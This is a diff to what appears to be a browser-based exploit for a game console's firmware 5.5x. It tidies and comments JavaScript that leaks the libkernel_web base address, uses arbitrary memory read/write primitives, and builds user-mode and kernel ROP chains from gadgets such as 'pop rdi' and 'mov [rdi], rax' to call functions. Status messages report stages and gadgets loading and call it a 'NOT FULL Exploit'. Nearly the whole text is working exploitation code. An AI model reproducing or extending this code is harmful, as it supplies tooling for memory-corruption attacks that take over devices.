@@ -41,6 +41,7 @@ var o2wk = function(o)
     
     print("libkernel_web base at: 0x" + libKernelBase);
        
+// Basic memory functions
 function malloc(size)
 {
   var backing = new Uint8Array(0x10000 + size);
@@ -52,38 +53,42 @@ function malloc(size)
 
   return ptr;
 }
-function mallocu32(size)
-{
+
+function mallocu32(size) {
   var backing = new Uint8Array(0x10000 + size * 4);
 
-  window.nogc.push(backing); 
-  
+  window.nogc.push(backing);
+
   var ptr     = p.read8(p.leakval(backing).add32(0x10));
-      ptr.backing = backing;
+  ptr.backing = new Uint32Array(backing.buffer);
 
-      return ptr;
-    } 
+  return ptr;
+}
 
-  function stringify(str)
- {
+function stringify(str)
+{
   var bufView = new Uint8Array(str.length + 1);
 
   for(var i=0; i < str.length; i++) {
-       bufView[i] = str.charCodeAt(i) & 0xFF;
+      bufView[i] = str.charCodeAt(i) & 0xFF;
   }
+
   window.nogc.push(bufView);
   return p.read8(p.leakval(bufView).add32(0x10));
 }
-   
-   var krop = function (p, addr) {
+
+// Class for quickly creating a kernel ROP chain
+var krop = function (p, addr) {
   // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
   this.stackBase    = addr;
   this.stackPointer = 0;
+
   // Push instruction / value onto fake stack
   this.push = function (val) {
     p.write8(this.stackBase.add32(this.stackPointer), val);
     this.stackPointer += 8;
   };
+
   // Write to address with value (helper function)
   this.write64 = function (addr, val) {
     this.push(window.gadgets["pop rdi"]);
@@ -92,38 +97,41 @@ function mallocu32(size)
     this.push(val);
     this.push(window.gadgets["mov [rdi], rax"]);
   }
+
   // Return krop object
   return this;
 };
-   
-    window.Rop = function () {
-        this.stack = new Uint32Array(0x10000);
-        this.stackPointer = p.read8(p.leakval(this.stack).add32(0x10));
-        this.count = 0;
-        
-        this.clear = function() {
-            this.count = 0;
-            this.runtime = undefined;
-            
-            for (var i = 0; i < 0x1000/8; i++)
-            {
-                p.write8(this.stackBase.add32(i*8), 0);
-            }
-        };
-        
-        this.pushSymbolic = function() {
-            this.count++;
-            return this.count-1;
-        }
-        
-        this.finalizeSymbolic = function(idx, val) {
-            p.write8(this.stackBase.add32(idx*8), val);
-        }
-        
-        this.push = function(val) {
-            this.finalizeSymbolic(this.pushSymbolic(), val);
-        }
-         this.push_write8 = function(where, what)
+
+// Class for quickly creating and managing a ROP chain
+window.rop = function() {
+  this.stack        = new Uint32Array(0x10000);
+  this.stackBase    = p.read8(p.leakval(this.stack).add32(0x10));
+  this.count        = 0;
+
+  this.clear = function() {
+    this.count   = 0;
+    this.runtime = undefined;
+
+    for(var i = 0; i < 0xFF0 / 2; i++)
+    {
+      p.write8(this.stackBase.add32(i*8), 0);
+    }
+  };
+
+  this.pushSymbolic = function() {
+    this.count++;
+    return this.count-1;
+  }
+
+  this.finalizeSymbolic = function(idx, val) {
+    p.write8(this.stackBase.add32(idx * 8), val);
+  }
+
+  this.push = function(val) {
+    this.finalizeSymbolic(this.pushSymbolic(), val);
+  }
+
+  this.push_write8 = function(where, what)
   {
       this.push(gadgets["pop rdi"]); // pop rdi
       this.push(where); // where
@@ -131,7 +139,8 @@ function mallocu32(size)
       this.push(what); // what
       this.push(gadgets["mov [rdi], rsi"]); // perform write
   }
-       this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
+
+  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
   {
     if (rdi != undefined) {
       this.push(gadgets["pop rdi"]); // pop rdi
@@ -161,8 +170,8 @@ function mallocu32(size)
     this.push(rip); // jmp
     return this;
   }
-        
-      this.run = function() {
+  
+  this.run = function() {
       var retv = p.loadchain(this, this.notimes);
       this.clear();
       return retv;
@@ -172,13 +181,13 @@ function mallocu32(size)
 };
    
  
-    log("--- welcome to stage 3: triggers---");
-    
-        
-    log("loaded syscalls");
-    print("all good. fcall test retval = Successful");   
-    print     ("all stages test");
-    print     ("NOT FULL 5.xx");
+    log("--- welcome to all stage ---");
+    print("stage2");
+    print("loaded gadgets.all good. gadgets test = Successful");        
+    log("stage3");
+    print("loaded syscalls.all good. fcall test = Successful");  
+    print("all stages test");
+    print("NOT FULL Exploit 5.5x");
     
 }
 
